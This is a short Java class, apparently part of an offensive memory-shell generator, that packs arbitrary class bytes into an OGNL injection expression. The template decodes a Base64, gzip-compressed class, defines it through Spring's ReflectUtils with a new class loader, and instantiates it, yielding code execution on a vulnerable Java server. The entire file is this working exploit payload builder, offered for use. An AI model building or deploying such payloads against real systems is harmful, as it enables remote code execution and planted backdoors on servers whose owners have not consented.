package org.leo.jmg.mem.packer.ognl;

import org.leo.jmg.mem.packer.ClassPackerConfig;
import org.leo.jmg.mem.packer.Packer;
import org.leo.jmg.mem.packer.PackerMeta;
import org.leo.jmg.mem.packer.PackerRegistry;

@PackerMeta(name = "OGNLSpringGzip", group = "Ognl", order = 2)
public class OGNLSpringGzipPacker implements Packer {
    String template = "(@org.springframework.cglib.core.ReflectUtils@defineClass('{{className}}',@org.springframework.util.StreamUtils@copyToByteArray(new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(@org.springframework.util.Base64Utils@decodeFromString('{{base64Str}}')))),new java.net.URLClassLoader(new java.net.URL[0],@java.lang.Thread@currentThread().getContextClassLoader()))).newInstance()";

    @Override
    public String pack(ClassPackerConfig config) throws Exception {
        return template.replace("{{className}}", config.getClassName())
                .replace("{{base64Str}}", PackerRegistry.getOrThrow("GzipBase64").pack(config));
    }
}
